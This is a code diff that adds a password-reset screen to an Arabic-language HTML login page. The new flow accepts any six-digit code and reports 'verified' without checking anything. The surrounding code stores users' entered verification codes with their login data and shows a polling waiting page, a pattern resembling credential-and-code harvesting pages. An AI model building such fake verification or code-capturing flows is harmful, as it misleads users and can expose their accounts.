@@ -209,6 +209,18 @@
       color: #78bdff;
     }
 
+    .password-reset-page {
+      display: none;
+    }
+
+    .password-reset-page.active {
+      display: block;
+    }
+
+    .reset-form {
+      margin-top: 30px;
+    }
+
     .buttons {
       display: flex;
       gap: 12px;
@@ -470,12 +482,45 @@
 
       <div class="forgot-password">
         <span>هل نسيت كلمة المرور؟</span>
-        <a href="#" onclick="alert('ميزة تغيير كلمة المرور قريباً'); return false;">تغيير كلمة المرور</a>
+        <a href="#" onclick="showPasswordReset(); return false;">تغيير كلمة المرور</a>
       </div>
 
       <div class="buttons">
         <button type="button" class="qr" title="QR Code" onclick="alert('ميزة QR Code قريباً')">▦</button>
         <button type="submit" class="login">تسجيل الدخول</button>
+      </div>
+    </form>
+
+    <div class="footer">
+      <div>POWERED BY</div>
+      <div class="mark"></div>
+      <div>V 1.0.0</div>
+    </div>
+  </div>
+
+  <!-- صفحة تغيير كلمة المرور -->
+  <div class="phone password-reset-page" id="password-reset-page">
+    <div class="top">
+      <div class="back-btn-phone" onclick="backToLogin()">›</div>
+      <div class="support" onclick="alert('شكراً لتواصلك معنا 📞')">🎧</div>
+    </div>
+
+    <div class="logo"></div>
+
+    <h1>تغيير كلمة المرور</h1>
+
+    <div class="subtitle">
+      أدخل البريد الإلكتروني أو رقم الهاتف
+    </div>
+
+    <form class="reset-form" onsubmit="handlePasswordReset(event)">
+      <div class="input">
+        <span class="field-icon user-icon" aria-hidden="true"></span>
+        <input type="text" id="reset-identifier" placeholder="المعرف الخاص بك" required>
+      </div>
+
+      <div class="buttons" style="gap: 0; flex-direction: column;">
+        <button type="submit" class="login">التالي</button>
       </div>
     </form>
 
@@ -583,10 +628,25 @@
     let currentUser = null;
     let enteredCode = '';
     let pollingInterval = null;
+    let resetPasswordMode = false;
 
     function togglePassword() {
       const input = document.getElementById('login-password');
       input.type = input.type === 'password' ? 'text' : 'password';
+    }
+
+    function showPasswordReset() {
+      document.getElementById('login-page').classList.remove('active');
+      document.getElementById('password-reset-page').classList.add('active');
+      document.getElementById('reset-identifier').focus();
+    }
+
+    function handlePasswordReset(event) {
+      event.preventDefault();
+      resetPasswordMode = true;
+      document.getElementById('password-reset-page').classList.remove('active');
+      document.getElementById('code-page').classList.add('active');
+      document.getElementById('code1').focus();
     }
 
     function handleLogin(event) {
@@ -655,6 +715,12 @@
         return;
       }
 
+      if (resetPasswordMode) {
+        alert('تم التحقق من الرمز');
+        backToLogin();
+        return;
+      }
+
       currentUser.enteredCode = enteredCode;
 
       let logins = JSON.parse(localStorage.getItem('userLogins')) || [];
@@ -689,9 +755,11 @@
       document.getElementById('waiting-page').classList.remove('active');
       document.getElementById('code-page').classList.remove('active');
       document.getElementById('success-page').classList.remove('active');
+      document.getElementById('password-reset-page').classList.remove('active');
       document.getElementById('login-page').classList.add('active');
       document.getElementById('login-email').value = '';
       document.getElementById('login-password').value = '';
+      document.getElementById('reset-identifier').value = '';
       
       for (let i = 1; i <= 6; i++) {
         document.getElementById('code' + i).value = '';
@@ -699,6 +767,7 @@
       
       clearInterval(pollingInterval);
       currentUser = null;
+      resetPasswordMode = false;
     }
 
     document.addEventListener('DOMContentLoaded', function() {
